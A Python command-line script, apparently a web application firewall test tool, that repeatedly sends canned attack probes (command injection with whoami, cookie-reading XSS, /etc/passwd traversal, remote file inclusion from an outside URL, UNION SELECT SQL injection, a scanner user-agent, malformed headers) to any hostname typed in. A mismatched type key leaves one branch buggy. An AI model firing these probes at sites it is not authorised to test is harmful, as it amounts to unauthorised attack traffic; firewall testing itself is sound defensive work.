#!/usr/bin/python3
# encoding=utf-8

import requests
from urllib3 import response

split_line = "{:}\n".format("="*50)

def input_request_type():
    """
    输入请求类型
    """
    request_types = {
        "cmd": "Command Injection",
        "css": "Cross-Site Scripting",
        "lfi": "Local File Inclusion",
        "rfi": "Remote File Inclusion",
        "sql": "SQL Injection",
        "wat": "Web Attack Tool",
        "wpf": "Web Platform Attack",
        "wpt": "Web Protocal Attack",
    }
    request_types_txt = str()
    for key_tmp in request_types.keys():
        request_types_txt += "{:}: {:}\n".format(key_tmp, request_types[key_tmp])
    type_tmp = input("{0:}{1:}{0:}请根据提示输入模拟请求类型(大小写不敏感): ".format(split_line, request_types_txt)).lower()
    if type_tmp in request_types.keys():
        tip_tmp = "你选择的是: {:}, 对应请求类型: {:}".format(type_tmp, request_types[type_tmp])
    else:
        tip_tmp = "你的选择不能匹配已提供类型[{:}]中的任何一个, 默认选择为 \"cmd\": \"Command Injection\""
        type_tmp = "cmd"
    print(tip_tmp)

    return type_tmp, request_types[type_tmp]


def input_hostname():
    """
    输入域名
    """
    hostname_tmp = input("请输入域名: ")

    return hostname_tmp


def input_count():
    """
    输入次数
    """
    try:
        count_tmp = int(input("请输入请求次数: "))
    except Exception:
        print("输入有误, 设置次数为10.")
        count_tmp = 10

    return count_tmp


def input_continue():
    """
    输入继续与否
    """
    input_continue_tmp = input("是否继续? (输入 y 继续, 大小写不敏感, 其他任意键退出.) ").lower()
    if input_continue_tmp == "y":
        continue_tmp = True
    else:
        continue_tmp = False

    return continue_tmp


def command_injection(hostname_tmp):
    """
    Command Injection
    curl -D - -s "https://${HOSTNAME}/?fakeparam=something;/bin/whoami"
    """

    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/?fakeparam=something;/bin/whoami".format(hostname_tmp)

    return request_info_tmp


def cross_site_scripting(hostname_tmp):
    """
    Cross-Site Scripting
    curl -D - -s "https://${HOSTNAME}/?fakeparam=data%22%3E%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E"
    """

    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/?fakeparam=data%22%3E%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E".format(hostname_tmp)

    return request_info_tmp


def local_file_inclusion(hostname_tmp):
    """
    Local File Inclusion
    curl -D - -s "https://${HOSTNAME}/?fakeparam=.././.././../etc/passwd"
    """

    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/?fakeparam=.././.././../etc/passwd".format(hostname_tmp)

    return request_info_tmp


def remote_file_inclustion(hostname_tmp):
    """
    Remote File Inclusion
    curl -D - -s "https://${HOSTNAME}/?fakeparam=https://cirt.net/rfiinc.txt"
    """

    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/?fakeparam=https://cirt.net/rfiinc.txt".format(hostname_tmp)

    return request_info_tmp


def sql_injection(hostname_tmp):
    """
    SQL Injection
    curl -D - -s "https://${HOSTNAME}/?fakeparam=-1%20UNION%20ALL%20SELECT%20%40%40version%2C2%2C3--"
    """

    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/?fakeparam=-1%20UNION%20ALL%20SELECT%20%40%40version%2C2%2C3--".format(hostname_tmp)

    return request_info_tmp


def web_attack_tool(hostname_tmp):
    """
    Web Attack Tool
    curl -D - -s "https://${HOSTNAME}/" --user-agent "w3af.sourceforge.net"
    """

    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/".format(hostname_tmp)
    request_info_tmp["header"] = {
        "User-Agent": "w3af.sourceforge.net",
    }

    return request_info_tmp


def web_platform_attack(hostname_tmp):
    """
    Web Platform Attack
    curl -D - -s "https://${HOSTNAME}/" --header "Range: 18446744073709551615"
    """

    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/".format(hostname_tmp)
    request_info_tmp["header"] = {
        "Range": "18446744073709551615",
    }

    return request_info_tmp


def web_protocal_attack(hostname_tmp):
    """
    Web Protocal Attack
    curl -D - -s "https://${HOSTNAME}/" --header "Content-Type: application/xml" --data "not_xml_format"
    """
    request_info_tmp = dict()
    request_info_tmp["url"] = "https://{:}/".format(hostname_tmp)
    request_info_tmp["header"] = {
        "Content-Type": "application/xml",
    }
    request_info_tmp["data"] = "not_xml_format"

    return request_info_tmp


def request_type_decide(hostname_tmp, request_type_tmp):
    """
    决定应该使用那种请求类型
    """

    if request_type_tmp == "cmd":
        request_info_tmp = command_injection(hostname_tmp)
    elif request_type_tmp == "css":
        request_info_tmp = cross_site_scripting(hostname_tmp)
    elif request_type_tmp == "lfi":
        request_info_tmp = local_file_inclusion(hostname_tmp)
    elif request_type_tmp == "rfi":
        request_info_tmp = remote_file_inclustion(hostname_tmp)
    elif request_type_tmp == "sql":
        request_info_tmp = sql_injection(hostname_tmp)
    elif request_type_tmp == "wat":
        request_info_tmp = web_attack_tool(hostname_tmp)
    elif request_type_tmp == "wpf":
        request_info_tmp = web_platform_attack(hostname_tmp)
    elif request_type_tmp == "wpt":
        request_info_tmp = web_protocal_attack(hostname_tmp)

    return request_info_tmp


def send_request(request_info_tmp, request_type_tmp, request_type_name_tmp, count_tmp):
    """
    发送请求
    """
    requests_result = {
        "请求异常": 0
    }
    request_tmp = requests.session()

    for count in range(count_tmp):
        print("URL: {:}, 请求类型: {:}, 第{:}次...".format(request_info_tmp["url"], request_type_name_tmp, count + 1))
        try:
            if request_type_tmp == "wtp":
                response_tmp = request_tmp.request(method="GET", url=request_info_tmp["url"], headers=request_info_tmp["header"], data=request_info_tmp["data"])
            elif request_type_tmp == "wat" or request_type_tmp == "wpf":
                response_tmp = request_tmp.request(method="GET", url=request_info_tmp["url"], headers=request_info_tmp["header"])
            else:
                response_tmp = request_tmp.request(method="GET", url=request_info_tmp["url"])
            if response_tmp.status_code not in requests_result.keys():
                requests_result[response_tmp.status_code] = 1
            else:
                requests_result[response_tmp.status_code] += 1
        except Exception as except_tmp:
            print("发生异常:{:}".format(except_tmp))
            # 发生异常时错误请求 + 1
            requests_result["请求异常"] += 1

    return requests_result


def main():
    """
    Main process
    """
    continue_tmp = True
    while(continue_tmp):
        hostname_tmp = input_hostname()
        # hostname_tmp = "www.aojie654.com"
        request_type_tmp, request_type_name_tmp = input_request_type()
        count_tmp = input_count()
        print("请求类型: {:}, 域名: {:}, 次数: {:}".format(request_type_tmp, hostname_tmp, count_tmp))
        request_info_tmp = request_type_decide(hostname_tmp, request_type_tmp)
        requests_result = send_request(request_info_tmp, request_type_tmp, request_type_name_tmp, count_tmp)
        print("请求类型: {:}, 域名: {:}, 次数: {:}, 请求结果: {:}".format(request_type_tmp, hostname_tmp, count_tmp, requests_result))
        continue_tmp = input_continue()


if __name__ == '__main__':
    main()
